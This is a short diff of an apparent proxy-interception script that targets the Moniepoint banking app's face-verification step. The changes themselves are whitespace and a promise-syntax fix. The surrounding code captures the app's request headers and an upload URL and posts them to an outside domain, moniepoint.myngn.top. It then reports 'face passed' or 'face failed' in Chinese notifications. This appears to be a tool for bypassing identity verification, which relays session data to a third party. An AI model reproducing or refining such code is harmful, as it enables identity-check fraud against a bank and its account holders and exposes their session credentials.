@@ -4,6 +4,8 @@ let upload_url = obj.upload_url;
 let headers = $request.headers;
 
 
+
+
 function sendPostRequest() {
     let myRequest = {
         url: 'https://moniepoint.myngn.top/api/receive_data',
@@ -18,6 +20,8 @@ function sendPostRequest() {
     };
 
 
+
+
     $task.fetch(myRequest).then(response => {
         if (response.statusCode === 200 || response.statusCode === "200") {
             $notify("Moniepoint", "人脸通过", "");
@@ -29,16 +33,18 @@ function sendPostRequest() {
             $notify("Moniepoint", "人脸失败", "");
             $done({});
         }
-    }).reason(error => {
+    }, reason => {
         $notify("Moniepoint", "人脸失败", "未知错误");
         $done({});
     });
 }
 
 
+
+
 if (upload_url) {
     sendPostRequest();
 } else {
-    $notify("Moniepoint", "人脸失败", "");
+    $notify("Moniepoint", "人脸失败", "");
     $done({});
 }
